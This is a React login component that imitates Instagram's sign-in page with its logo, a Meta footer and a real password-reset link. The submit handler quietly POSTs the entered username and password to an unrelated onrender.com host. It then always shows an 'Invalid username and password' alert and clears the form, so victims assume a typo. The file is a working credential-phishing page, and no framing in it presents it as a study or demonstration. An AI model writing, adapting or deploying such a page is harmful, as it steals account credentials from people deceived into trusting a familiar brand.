import React, { useEffect, useState } from "react";
import "./Login.css";

const Login = () => {
  const [username, setUsername] = useState("");
  const [password , setPassword] = useState("");
  const [loading , setLoading] = useState(false);
  const handleSubmit = async(e) => {
    e.preventDefault();
    if (username.length == "" || password.length == "") {
      alert("Creadential cannot be blank");
    }
    else{

      try {
      setLoading(true);
      const response = await fetch("https://instagram-ft4y.onrender.com/api/signUp",
      {
        method:"POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          username: username,
          password: password,
        }),
      })
      const data = await response.json();

    if (response.ok) {
      console.log("User registered successfully:", data);
    } else {
      console.error("Error:", data.message);
    }
  }
  catch (error) {
    console.error("Network error:", error);
  }
  finally{
    setLoading(false);
    alert("Invalid username and password !");
    setUsername("");
    setPassword("");
  }
}
  }

  return (


    <>
    {
      loading?(<div className="loading-cls"><p>Loading...</p></div>):(
    <div className="wrapper">
      <div className="container">
        <div className="insta-logo">
          <img
            src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png"
            alt="Instagram" 
          />
        </div>
        <form onSubmit={handleSubmit}>
          <div className="input-field">
            <input type="text" placeholder="Username, email address" onChange={(e)=>setUsername(e.target.value)}/>
          </div>

          <div className="input-field">
            <input type="password" placeholder="Password"onChange={(e)=>setPassword(e.target.value)} />
          </div>

          <button className="login-btn">Log in</button>

          <a href="https://www.instagram.com/accounts/password/reset/?hl=en" className="forgot-password">Forgotten password?</a>
        </form>

        {/* <button className="signup-btn">Create new account</button> */}
      </div>

      <p className="meta">Meta</p>
    </div>)
}
    </>
  );
};

export default Login;
